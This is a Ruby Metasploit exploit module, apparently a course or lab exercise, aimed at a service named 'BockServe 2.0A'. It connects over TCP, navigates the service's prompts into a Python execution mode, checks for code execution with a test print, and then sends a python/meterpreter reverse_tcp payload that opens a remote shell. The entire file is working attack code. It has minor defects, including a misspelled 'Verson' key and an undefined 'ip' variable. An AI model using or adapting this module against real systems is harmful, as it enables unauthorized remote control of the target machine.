require 'msf/core'
require 'timeout'
require 'socket'

class MetasploitModule < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize
		super(
			'Name' => 'auxiliary_rsangamr.rb',
			'Verson' => '$Revision: 7243',
			'Description' => 'This module exploits a python vulnerability to open a meterpreter',
			'Author' => 'Rishi Sangamreddy',
			'License' => MSF_LICENSE,
			'DefaultOptions' =>
	        {
	          'Payload' => 'python/meterpreter/reverse_tcp',
	        },
          	'Targets'        =>
        	[
          		['BockServe 2.0A', {}],
        	],
        	'References'     =>
        		[],
        	'Platform'       => 'python',
        	'Privileged'     => false,
      		'DisclosureDate' => "",
      		'DefaultTarget'  => 0
		)

	end

	def exploit


		sock = connect()

		info = sock.recv(1024)

		sock.puts("view")
		info = sock.recv(1200)
		info = sock.recv(1024)
		sock.puts("yes")
		info = sock.recv(1024)
		sock.puts("print('Vulnerable')")
		
		begin
			Timeout.timeout(3) do
		       	info = sock.recv(1024)
		    end
		rescue ::Timeout::Error
		    print_bad("#{ip} - No BockServe 2.0A Vulnerability")
		    disconnect()
		    return
		end

		sock.puts("#{payload.encoded}\n")

	disconnect()

	end

end


